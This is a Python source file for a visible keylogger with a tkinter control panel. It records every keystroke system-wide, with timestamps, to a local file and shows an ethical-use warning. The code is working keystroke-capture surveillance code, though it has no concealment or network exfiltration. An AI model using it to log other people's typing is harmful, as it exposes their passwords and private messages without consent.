import tkinter as tk
from tkinter import scrolledtext, messagebox
from pynput import keyboard
import threading
import os
from datetime import datetime

LOG_FILE = "key_log.txt"
logging = False

def write_to_log(key):
    try:
        with open(LOG_FILE, "a") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            key = str(key).replace("'", "")
            if key == "Key.space":
                f.write(f"[{timestamp}] SPACE\n")
            elif key == "Key.enter":
                f.write(f"[{timestamp}] ENTER\n")
            elif key.startswith("Key."):
                f.write(f"[{timestamp}] {key[4:].upper()}\n")
            else:
                f.write(f"[{timestamp}] {key}\n")
    except Exception as e:
        print("Log writing error:", e)


def on_press(key):
    if logging:
        write_to_log(key)

def start_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def toggle_logging(state, start_btn, stop_btn):
    global logging
    logging = state
    if state:
        start_btn.config(state="disabled")
        stop_btn.config(state="normal")
        threading.Thread(target=start_listener, daemon=True).start()
    else:
        start_btn.config(state="normal")
        stop_btn.config(state="disabled")

def view_logs(log_display):
    if not os.path.exists(LOG_FILE):
        log_display.delete(1.0, tk.END)
        log_display.insert(tk.END, "No logs found.")
        return
    with open(LOG_FILE, "r") as f:
        log_display.delete(1.0, tk.END)
        log_display.insert(tk.END, f.read())

def clear_logs(log_display):
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
    log_display.delete(1.0, tk.END)

def show_warning():
    messagebox.showwarning("Ethical Use Only", "This tool is for ethical and educational use only.\nEnsure you have permission before logging keys.")

def create_ui():
    root = tk.Tk()
    root.title("Expert Keylogger - Maroon Edition")
    root.geometry("600x450")
    root.config(bg="#800000")  # Maroon

    show_warning()

    tk.Label(root, text="Keylogger Control Panel", font=("Helvetica", 18), bg="#800000", fg="white").pack(pady=10)

    btn_frame = tk.Frame(root, bg="#800000")
    btn_frame.pack()

    start_btn = tk.Button(btn_frame, text="Start Logging", bg="#A52A2A", fg="white", width=15, command=lambda: toggle_logging(True, start_btn, stop_btn))
    stop_btn = tk.Button(btn_frame, text="Stop Logging", bg="#8B0000", fg="white", width=15, command=lambda: toggle_logging(False, start_btn, stop_btn))
    view_btn = tk.Button(btn_frame, text="View Logs", bg="#B22222", fg="white", width=15, command=lambda: view_logs(log_display))
    clear_btn = tk.Button(btn_frame, text="Clear Logs", bg="#B22222", fg="white", width=15, command=lambda: clear_logs(log_display))

    start_btn.grid(row=0, column=0, padx=5, pady=5)
    stop_btn.grid(row=0, column=1, padx=5, pady=5)
    view_btn.grid(row=1, column=0, padx=5, pady=5)
    clear_btn.grid(row=1, column=1, padx=5, pady=5)
    stop_btn.config(state="disabled")

    log_display = scrolledtext.ScrolledText(root, width=70, height=15, bg="#FAEBD7", fg="#800000")
    log_display.pack(pady=10)

    root.mainloop()

create_ui()
